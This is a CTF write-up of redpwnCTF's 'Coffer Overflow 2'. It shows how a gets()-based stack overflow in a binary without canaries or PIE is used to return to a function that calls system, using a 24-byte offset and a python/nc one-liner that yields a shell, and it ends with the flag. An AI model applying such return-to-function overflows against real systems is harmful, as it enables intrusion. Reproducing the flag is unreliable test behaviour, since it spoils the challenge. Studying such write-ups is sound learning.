# Coffer Overflow 2

- Genre pwn  

I examined the given binary with some commands first.  
```sh
file coffer-overflow-2
coffer-overflow-2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0904cdb0421222a7323625c5e603d5368a2e9928, not stripped
checksec coffer-overflow-2
[*] 'coffer-overflow-2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
This was a 64 bit elf and most of the security features were disabled.  

I ran this binary to see what it did.  

```sh
./coffer-overflow-2
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
AAAAAAAAAA
```

It just asked for the user input then exited.  
So I ran this program with gdb this time.  

![image](https://user-images.githubusercontent.com/53568647/85862033-92c53880-b804-11ea-8624-6eca9e1222d6.png)

It had gets function in the main and possibilities to cause stack buffer overflow to return to an arbitrary function.  

Then I ran objdump to see what functions this binary had because if there was an easy 'get-flag-function' that would bring me a straight win.  

```sh
objdump -D coffer-overflow-2
```

![image](https://user-images.githubusercontent.com/53568647/85861826-4679f880-b804-11ea-9c81-5f7339b4503a.png)

And I was able to find an interesting function __binFunction__ which called system located at __0x4006e6__.  
I went back to gdb session to find out the right size of buffer required to cause overflow and call binFunction.  

The return address from main function was found by observing the gdb session, and it was __0x7ffff7e16e0b__. The size of the buffer could be calcurated with the location of the address in the stack.  

![image](https://user-images.githubusercontent.com/53568647/85861836-48dc5280-b804-11ea-9a02-3735d8d343f9.png)

I could use pattern_create and pattern_offset to calcurate the size of the buffer as well and find same result, 24 bytes.  
Then simply I could send a request to get a shell.  

![image](https://user-images.githubusercontent.com/53568647/85861841-4aa61600-b804-11ea-8726-212b5977c7d4.png)

```sh
(python -c "print('A' * 24 + '\xe6\x06\x40\x00' + '\x00'* 4)"; cat) | nc 2020.redpwnc.tf 31908
```

![image](https://user-images.githubusercontent.com/53568647/85861846-4c6fd980-b804-11ea-8d0a-68bdccb334fa.png)

flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
